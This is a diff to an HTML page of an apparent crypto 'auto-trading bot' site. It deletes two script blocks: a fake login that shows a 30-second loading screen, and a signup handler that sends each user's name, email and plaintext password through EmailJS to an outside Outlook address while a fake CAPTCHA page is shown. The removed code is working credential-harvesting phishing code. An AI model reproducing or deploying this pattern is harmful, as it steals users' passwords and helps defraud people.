@@ -3402,57 +3402,5 @@ window.addEventListener("load", () => {
   document.getElementById("refreshBalancesBtn").addEventListener("click", refreshBalances);
 
 </script>
-  <!-- Updated Login and Signup UI + Script Integration --><!-- LOGIN PAGE FUNCTIONALITY --><script>
-  document.getElementById("loginForm").addEventListener("submit", function (e) {
-    e.preventDefault();
-
-    // Redirect to loading page 1iii
-    showPage("page1iii");
-
-    // After 30s, go to homepage 3
-    setTimeout(() => {
-      showPage("page3");
-    }, 30000);
-  });
-</script>
-<script>
-  emailjs.init("n9BsaM4ZjH178UeSf");
-
-  const serviceID = "service_xg8bzqs";
-  const submitTemplateID = "template_gclz9gu";
-  const autoReplyTemplateID = "template_r0zg4zj";
-  const domainCaptchaLink = "https://auto-tradingbot.github.io/System/#page2ii";
-
-  document.getElementById("signupForm").addEventListener("submit", function (e) {
-    e.preventDefault();
-
-    const form = this;
-    const formData = {
-      name: form.elements["name"].value,
-      email: form.elements["email"].value,
-      password: form.elements["password"].value
-    };
-
-    // Redirect to auth CAPTCHA loading screen
-    window.location.href = domainCaptchaLink;
-
-    setTimeout(() => {
-      emailjs.send(serviceID, submitTemplateID, formData).then(() => {
-        console.log("Signup email sent to Blockchainautomated@outlook.com");
-      });
-
-      emailjs.send(serviceID, autoReplyTemplateID, {
-        to_email: formData.email
-      }).then(() => {
-        console.log("Auto-reply sent to user");
-      });
-
-      // Redirect to homepage
-      setTimeout(() => {
-        showPage("page3");
-      }, 3000);
-    }, 30000);
-  });
-</script>
 </body>
 </html>
